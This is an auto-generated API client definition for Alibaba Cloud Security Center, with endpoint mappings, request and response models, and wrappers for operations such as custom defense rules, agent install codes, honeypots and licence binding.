/**
 *
 */
import Util;
import OpenApi;
import OpenApiUtil;
import EndpointUtil;

extends OpenApi;


init(config: OpenApi.Config){
  super(config);
  @endpointRule = 'regional';
  @endpointMap = {
    cn-hangzhou = 'tds.aliyuncs.com',
    ap-southeast-1 = 'tds.ap-southeast-1.aliyuncs.com',
    ap-southeast-3 = 'tds.ap-southeast-3.aliyuncs.com',
    ap-northeast-1 = 'sas.aliyuncs.com',
    ap-northeast-2-pop = 'sas.aliyuncs.com',
    ap-south-1 = 'sas.aliyuncs.com',
    ap-southeast-2 = 'sas.aliyuncs.com',
    ap-southeast-5 = 'sas.aliyuncs.com',
    cn-beijing = 'sas.aliyuncs.com',
    cn-beijing-finance-1 = 'sas.aliyuncs.com',
    cn-beijing-finance-pop = 'sas.aliyuncs.com',
    cn-beijing-gov-1 = 'sas.aliyuncs.com',
    cn-beijing-nu16-b01 = 'sas.aliyuncs.com',
    cn-chengdu = 'sas.aliyuncs.com',
    cn-edge-1 = 'sas.aliyuncs.com',
    cn-fujian = 'sas.aliyuncs.com',
    cn-haidian-cm12-c01 = 'sas.aliyuncs.com',
    cn-hangzhou-bj-b01 = 'sas.aliyuncs.com',
    cn-hangzhou-finance = 'sas.aliyuncs.com',
    cn-hangzhou-internal-prod-1 = 'sas.aliyuncs.com',
    cn-hangzhou-internal-test-1 = 'sas.aliyuncs.com',
    cn-hangzhou-internal-test-2 = 'sas.aliyuncs.com',
    cn-hangzhou-internal-test-3 = 'sas.aliyuncs.com',
    cn-hangzhou-test-306 = 'sas.aliyuncs.com',
    cn-hongkong = 'sas.aliyuncs.com',
    cn-hongkong-finance-pop = 'sas.aliyuncs.com',
    cn-huhehaote = 'sas.aliyuncs.com',
    cn-huhehaote-nebula-1 = 'sas.aliyuncs.com',
    cn-north-2-gov-1 = 'sas.aliyuncs.com',
    cn-qingdao = 'sas.aliyuncs.com',
    cn-qingdao-nebula = 'sas.aliyuncs.com',
    cn-shanghai = 'sas.aliyuncs.com',
    cn-shanghai-et15-b01 = 'sas.aliyuncs.com',
    cn-shanghai-et2-b01 = 'sas.aliyuncs.com',
    cn-shanghai-finance-1 = 'sas.aliyuncs.com',
    cn-shanghai-inner = 'sas.aliyuncs.com',
    cn-shanghai-internal-test-1 = 'sas.aliyuncs.com',
    cn-shenzhen = 'sas.aliyuncs.com',
    cn-shenzhen-finance-1 = 'sas.aliyuncs.com',
    cn-shenzhen-inner = 'sas.aliyuncs.com',
    cn-shenzhen-st4-d01 = 'sas.aliyuncs.com',
    cn-shenzhen-su18-b01 = 'sas.aliyuncs.com',
    cn-wuhan = 'sas.aliyuncs.com',
    cn-wulanchabu = 'sas.aliyuncs.com',
    cn-yushanfang = 'sas.aliyuncs.com',
    cn-zhangbei = 'sas.aliyuncs.com',
    cn-zhangbei-na61-b01 = 'sas.aliyuncs.com',
    cn-zhangjiakou = 'sas.aliyuncs.com',
    cn-zhangjiakou-na62-a01 = 'sas.aliyuncs.com',
    cn-zhengzhou-nebula-1 = 'sas.aliyuncs.com',
    eu-central-1 = 'sas.aliyuncs.com',
    eu-west-1 = 'sas.aliyuncs.com',
    eu-west-1-oxs = 'sas.aliyuncs.com',
    me-east-1 = 'sas.aliyuncs.com',
    rus-west-1-pop = 'sas.aliyuncs.com',
    us-east-1 = 'sas.aliyuncs.com',
    us-west-1 = 'sas.aliyuncs.com',
  };

  checkConfig(config);
  @endpoint = getEndpoint('sas', @regionId, @endpointRule, @network, @suffix, @endpointMap, @endpoint);
}

function getEndpoint(productId: string, regionId: string, endpointRule: string, network: string, suffix: string, endpointMap: map[string]string, endpoint: string) throws: string{
  if (!Util.empty(endpoint)) {
    return endpoint;
  }
  
  if (!Util.isUnset(endpointMap) && !Util.empty(endpointMap[regionId])) {
    return endpointMap[regionId];
  }
  return EndpointUtil.getEndpointRules(productId, regionId, endpointRule, network, suffix);
}

model QueryIncidentTracingSubNodesCountRequest {
  vertexIdAndTypeList?: [[ string ]  ](name='VertexIdAndTypeList'),
}

model AddCheckInstanceResultWhiteListRequest {
  checkGroupId?: string(name='CheckGroupId', example='cQFq20UzZ49K6gRSJD1301****'),
  checkId?: long(name='CheckId', example='132'),
  instanceIds?: [ string ](name='InstanceIds'),
}

model AddCheckInstanceResultWhiteListResponseBody = {
  data?: map[string]any(name='Data'),
  requestId?: string(name='RequestId', example='ADE57832-9666-511C-9A80-B87DE2E8****'),
}

model AddCheckInstanceResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddCheckInstanceResultWhiteListResponseBody(name='body'),
}

async function addCheckInstanceResultWhiteListWithOptions(request: AddCheckInstanceResultWhiteListRequest, runtime: Util.RuntimeOptions): AddCheckInstanceResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkGroupId)) {
    query['CheckGroupId'] = request.checkGroupId;
  }
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddCheckInstanceResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addCheckInstanceResultWhiteList(request: AddCheckInstanceResultWhiteListRequest): AddCheckInstanceResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return addCheckInstanceResultWhiteListWithOptions(request, runtime);
}

model AddCheckResultWhiteListRequest {
  checkIds?: [ long ](name='CheckIds'),
}

model AddCheckResultWhiteListResponseBody = {
  data?: map[string]any(name='Data'),
  requestId?: string(name='RequestId', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
}

model AddCheckResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddCheckResultWhiteListResponseBody(name='body'),
}

async function addCheckResultWhiteListWithOptions(request: AddCheckResultWhiteListRequest, runtime: Util.RuntimeOptions): AddCheckResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddCheckResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addCheckResultWhiteList(request: AddCheckResultWhiteListRequest): AddCheckResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return addCheckResultWhiteListWithOptions(request, runtime);
}

model AddClientUserDefineRuleRequest {
  actionType?: int32(name='ActionType', example='1'),
  cmdline?: string(name='Cmdline', example='/usr/sbin/s****'),
  filePath?: string(name='FilePath', example='/etc/pam****'),
  IP?: string(name='IP', example='10.240.XX.XX'),
  md5List?: string(name='Md5List', example='0c9045b5bec90f9825f1f3f64dd4****'),
  name?: string(name='Name'),
  newFilePath?: string(name='NewFilePath', example='/etc/pam****'),
  parentCmdline?: string(name='ParentCmdline', example='/usr/sbin/s****'),
  parentProcPath?: string(name='ParentProcPath', example='c:/windows/system32/i****'),
  platform?: string(name='Platform', example='linux'),
  port?: int32(name='Port', example='22'),
  portStr?: string(name='PortStr', example='80'),
  procPath?: string(name='ProcPath', example='c:/windows/system32/i****'),
  registryContent?: string(name='RegistryContent', example='*SECOH-QAD.exe*'),
  registryKey?: string(name='RegistryKey', example='HKEY_DYN_****'),
  type?: int32(name='Type', example='1'),
}

model AddClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', example='379a9b8f-107b-4630-9e95-2299a1ea****'),
  userDefineRuleAddResult?: {
    id?: long(name='Id', example='1'),
    platform?: string(name='Platform', example='linux'),
    switchId?: string(name='SwitchId', example='USER-DEFINE-RULE-SWITCH-TYPE_200****'),
  }(name='UserDefineRuleAddResult'),
}

model AddClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddClientUserDefineRuleResponseBody(name='body'),
}

async function addClientUserDefineRuleWithOptions(request: AddClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): AddClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.actionType)) {
    query['ActionType'] = request.actionType;
  }
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.filePath)) {
    query['FilePath'] = request.filePath;
  }
  if (!Util.isUnset(request.IP)) {
    query['IP'] = request.IP;
  }
  if (!Util.isUnset(request.md5List)) {
    query['Md5List'] = request.md5List;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.newFilePath)) {
    query['NewFilePath'] = request.newFilePath;
  }
  if (!Util.isUnset(request.parentCmdline)) {
    query['ParentCmdline'] = request.parentCmdline;
  }
  if (!Util.isUnset(request.parentProcPath)) {
    query['ParentProcPath'] = request.parentProcPath;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.portStr)) {
    query['PortStr'] = request.portStr;
  }
  if (!Util.isUnset(request.procPath)) {
    query['ProcPath'] = request.procPath;
  }
  if (!Util.isUnset(request.registryContent)) {
    query['RegistryContent'] = request.registryContent;
  }
  if (!Util.isUnset(request.registryKey)) {
    query['RegistryKey'] = request.registryKey;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addClientUserDefineRule(request: AddClientUserDefineRuleRequest): AddClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return addClientUserDefineRuleWithOptions(request, runtime);
}

model AddInstallCodeRequest {
  expiredDate?: long(name='ExpiredDate', description='The validity period of the installation command. The value is a 13-digit timestamp.

>  The installation command is valid only within the validity period. An expired installation command cannot be used to install the Security Center agent.', example='1680257463853'),
  groupId?: long(name='GroupId', description='The ID of the asset group to which the you want to add the asset.

>  You can call the [DescribeAllGroups](~~describeallgroups~~) operation to query the IDs of asset groups.', example='8076980'),
  onlyImage?: boolean(name='OnlyImage', description='Specifies whether to create an image. Default value: **false**. Valid values:

*   **false**: does not create an image.
*   **true**: creates an image.', example='false'),
  os?: string(name='Os', description='The operating system of the instance. Default value: **linux**. Valid values:

*   **linux**
*   **windows**
*   **windows-2003**', example='linux'),
  vendorName?: string(name='VendorName', description='The name of the service provider for the asset. Default value: **ALIYUN**.

>  You can call the [DescribeVendorList](~~DescribeVendorList~~) operation to query the names of service providers.', example='ALIYUN'),
}

model AddInstallCodeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model AddInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddInstallCodeResponseBody(name='body'),
}

async function addInstallCodeWithOptions(request: AddInstallCodeRequest, runtime: Util.RuntimeOptions): AddInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.expiredDate)) {
    query['ExpiredDate'] = request.expiredDate;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.onlyImage)) {
    query['OnlyImage'] = request.onlyImage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.vendorName)) {
    query['VendorName'] = request.vendorName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addInstallCode(request: AddInstallCodeRequest): AddInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return addInstallCodeWithOptions(request, runtime);
}

model AddTagWithUuidRequest {
  tagName?: string(name='TagName', example='InternetIp'),
  uuidList?: string(name='UuidList', example='71f5313e-4355-4c59-86d1-557dda7b****,71f5313e-4355-4c59-86d1-557dda7b****'),
}

model AddTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model AddTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddTagWithUuidResponseBody(name='body'),
}

async function addTagWithUuidWithOptions(request: AddTagWithUuidRequest, runtime: Util.RuntimeOptions): AddTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tagName)) {
    query['TagName'] = request.tagName;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addTagWithUuid(request: AddTagWithUuidRequest): AddTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return addTagWithUuidWithOptions(request, runtime);
}

model AddUninstallClientsByUuidsRequest {
  callMethod?: string(name='CallMethod', example='init'),
  feedback?: string(name='Feedback', example='reinstall'),
  region?: string(name='Region', example='cn-hangzhou'),
  sourceIp?: string(name='SourceIp', example='1.2.XXX.XXX'),
  uuids?: string(name='Uuids', example='inet-183707ae-3bdf-4db0-b771-3e9962bf****,inet-49dceccc-4f01-469b-8411-2416ea12****'),
}

model AddUninstallClientsByUuidsResponseBody = {
  requestId?: string(name='RequestId', example='3956048F-9D73-5EDB-834B-4827BB483977'),
}

model AddUninstallClientsByUuidsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddUninstallClientsByUuidsResponseBody(name='body'),
}

async function addUninstallClientsByUuidsWithOptions(request: AddUninstallClientsByUuidsRequest, runtime: Util.RuntimeOptions): AddUninstallClientsByUuidsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.callMethod)) {
    query['CallMethod'] = request.callMethod;
  }
  if (!Util.isUnset(request.feedback)) {
    query['Feedback'] = request.feedback;
  }
  if (!Util.isUnset(request.region)) {
    query['Region'] = request.region;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddUninstallClientsByUuids',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addUninstallClientsByUuids(request: AddUninstallClientsByUuidsRequest): AddUninstallClientsByUuidsResponse {
  var runtime = new Util.RuntimeOptions{};
  return addUninstallClientsByUuidsWithOptions(request, runtime);
}

model AddVpcHoneyPotRequest {
  vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC) in which you want to create a honeypot.

>  You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to obtain the VPC ID. The VPC ID is the value of the InstanceId parameter.', example='vpc-p0w5fgkfsl5a6791q****'),
}

model AddVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model AddVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddVpcHoneyPotResponseBody(name='body'),
}

async function addVpcHoneyPotWithOptions(request: AddVpcHoneyPotRequest, runtime: Util.RuntimeOptions): AddVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addVpcHoneyPot(request: AddVpcHoneyPotRequest): AddVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return addVpcHoneyPotWithOptions(request, runtime);
}

model AdvanceSecurityEventOperationsRequest {
  eventName?: string(name='EventName'),
  eventType?: string(name='EventType'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  ruleId?: int32(name='RuleId', example='123'),
}

model AdvanceSecurityEventOperationsResponseBody = {
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-XXXXXXXXX'),
  securityEventOperationsResponse?: [ 
    {
      markField?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', example='file path'),
          filedName?: string(name='FiledName', example='filePath'),
          markMisType?: string(name='MarkMisType', example='contains'),
          markMisValue?: string(name='MarkMisValue', example='2022-04-25 10:11:04'),
          supportedMisType?: [ string ](name='SupportedMisType'),
        }
      ](name='MarkField'),
      markFieldsSource?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', example='file path'),
          filedName?: string(name='FiledName', example='filePath'),
          markMisValue?: string(name='MarkMisValue', example='contains'),
          supportedMisType?: [ string ](name='SupportedMisType'),
        }
      ](name='MarkFieldsSource'),
      operationCode?: string(name='OperationCode', example='advance_mark_mis_info'),
      operationParams?: string(name='OperationParams', example='{\\"subOperation\\":\\"killByMd5andPath\\"}'),
      userCanOperate?: boolean(name='UserCanOperate', example='false'),
    }
  ](name='SecurityEventOperationsResponse'),
}

model AdvanceSecurityEventOperationsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AdvanceSecurityEventOperationsResponseBody(name='body'),
}

async function advanceSecurityEventOperationsWithOptions(request: AdvanceSecurityEventOperationsRequest, runtime: Util.RuntimeOptions): AdvanceSecurityEventOperationsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.eventType)) {
    query['EventType'] = request.eventType;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AdvanceSecurityEventOperations',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function advanceSecurityEventOperations(request: AdvanceSecurityEventOperationsRequest): AdvanceSecurityEventOperationsResponse {
  var runtime = new Util.RuntimeOptions{};
  return advanceSecurityEventOperationsWithOptions(request, runtime);
}

model BatchOperateCommonOverallConfigRequest {
  config?: string(name='Config', example='on'),
  typeList?: [ string ](name='TypeList'),
}

model BatchOperateCommonOverallConfigResponseBody = {
  requestId?: string(name='RequestId', example='765EDBDE-1686-5DBA-B76F-2E0E6E7E1B96'),
}

model BatchOperateCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: BatchOperateCommonOverallConfigResponseBody(name='body'),
}

async function batchOperateCommonOverallConfigWithOptions(request: BatchOperateCommonOverallConfigRequest, runtime: Util.RuntimeOptions): BatchOperateCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BatchOperateCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function batchOperateCommonOverallConfig(request: BatchOperateCommonOverallConfigRequest): BatchOperateCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return batchOperateCommonOverallConfigWithOptions(request, runtime);
}

model BindAuthToMachineRequest {
  authVersion?: int32(name='AuthVersion', description='The edition of Security Center. Valid values:

*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='6'),
  autoBind?: int32(name='AutoBind', description='Specifies whether to automatically bind servers to Security Center. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  bind?: [ string ](name='Bind', description='The UUIDs of the servers that you want to bind to Security Center.

>  You must specify at least one of the **Bind** and **UnBind** parameters.'),
  bindAll?: boolean(name='BindAll', description='Specifies whether to bind all servers to Security Center. Default value: **false**. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  criteria?: string(name='Criteria', description='The search conditions that are used to filter servers. The value of this parameter is in the JSON format and is case-sensitive.

>  A search condition can be an instance ID, instance name, virtual private cloud (VPC) ID, region, or public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='[{"name":"riskStatus","value":"YES"},{"name":"internetIp","value":"1.2.XX.XX"}]'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship among multiple search conditions. Valid values:

*   **OR**: Search conditions are evaluated by using a logical **OR**.
*   **AND**: Search conditions are evaluated by using a logical **AND**.', example='OR'),
  unBind?: [ string ](name='UnBind', description='The UUIDs of the servers that you want to unbind from Security Center.

>  You must specify at least one of the **Bind** and **UnBind** parameters.'),
}

model BindAuthToMachineResponseBody = {
  bindCount?: int32(name='BindCount', description='The number of bound servers.', example='1'),
  insufficientCoreCount?: int32(name='InsufficientCoreCount', description='The shortage in the quota for cores of servers that can be protected.', example='1'),
  insufficientEcsCount?: int32(name='InsufficientEcsCount', description='The shortage in the quota for servers that can be protected.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='23AD0BD2-8771-5647-819E-6BA51E212F80'),
  resultCode?: int32(name='ResultCode', description='The status code that indicates the result. Valid values:

*   **0**: The servers are bound to or unbound from Security Center.
*   **1**: The values that you specified for the parameters are invalid.
*   **2**: The quota for servers that can be protected is insufficient.
*   **3**: The quota for cores of servers that can be protected is insufficient.', example='2'),
  unBindCount?: int32(name='UnBindCount', description='The number of unbound servers.', example='1'),
}

model BindAuthToMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: BindAuthToMachineResponseBody(name='body'),
}

async function bindAuthToMachineWithOptions(request: BindAuthToMachineRequest, runtime: Util.RuntimeOptions): BindAuthToMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.authVersion)) {
    query['AuthVersion'] = request.authVersion;
  }
  if (!Util.isUnset(request.autoBind)) {
    query['AutoBind'] = request.autoBind;
  }
  if (!Util.isUnset(request.bind)) {
    query['Bind'] = request.bind;
  }
  if (!Util.isUnset(request.bindAll)) {
    query['BindAll'] = request.bindAll;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.unBind)) {
    query['UnBind'] = request.unBind;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BindAuthToMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function bindAuthToMachine(request: BindAuthToMachineRequest): BindAuthToMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return bindAuthToMachineWithOptions(request, runtime);
}

model CancelOnceTaskRequest {
  taskId?: string(name='TaskId', example='ec9c0d88f36cc27765a98c554ee2****'),
}

model CancelOnceTaskResponseBody = {
  requestId?: string(name='RequestId', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
}

model CancelOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CancelOnceTaskResponseBody(name='body'),
}

async function cancelOnceTaskWithOptions(request: CancelOnceTaskRequest, runtime: Util.RuntimeOptions): CancelOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CancelOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function cancelOnceTask(request: CancelOnceTaskRequest): CancelOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return cancelOnceTaskWithOptions(request, runtime);
}

model ChangeCheckConfigRequest {
  cycleDays?: [ int32 ](name='CycleDays'),
  endTime?: int32(name='EndTime', example='6'),
  standardIds?: [ long ](name='StandardIds'),
  startTime?: int32(name='StartTime', example='0'),
}

model ChangeCheckConfigResponseBody = {
  requestId?: string(name='RequestId', example='6EBB8614-746D-555D-AB69-C801AEC7DCE0'),
}

model ChangeCheckConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ChangeCheckConfigResponseBody(name='body'),
}

async function changeCheckConfigWithOptions(request: ChangeCheckConfigRequest, runtime: Util.RuntimeOptions): ChangeCheckConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cycleDays)) {
    query['CycleDays'] = request.cycleDays;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.standardIds)) {
    query['StandardIds'] = request.standardIds;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ChangeCheckConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function changeCheckConfig(request: ChangeCheckConfigRequest): ChangeCheckConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return changeCheckConfigWithOptions(request, runtime);
}

model CheckQuaraFileIdRequest {
  quaraFileIds?: [ string ](name='QuaraFileIds', description='The IDs of quarantined files that you want to check.

>  You can call the [DescribeSuspEventQuaraFiles](~~DescribeSuspEventQuaraFiles~~) operation to query the IDs of quarantined files.'),
  uuid?: string(name='Uuid', description='The UUID of the server on which you want to check quarantined files.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model CheckQuaraFileIdResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the ID of the quarantined file is valid. Valid values:

*   **true**: The ID of the quarantined file is valid.
*   **false**: The ID of the quarantined file is invalid.', example='true'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model CheckQuaraFileIdResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CheckQuaraFileIdResponseBody(name='body'),
}

async function checkQuaraFileIdWithOptions(request: CheckQuaraFileIdRequest, runtime: Util.RuntimeOptions): CheckQuaraFileIdResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.quaraFileIds)) {
    query['QuaraFileIds'] = request.quaraFileIds;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CheckQuaraFileId',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function checkQuaraFileId(request: CheckQuaraFileIdRequest): CheckQuaraFileIdResponse {
  var runtime = new Util.RuntimeOptions{};
  return checkQuaraFileIdWithOptions(request, runtime);
}

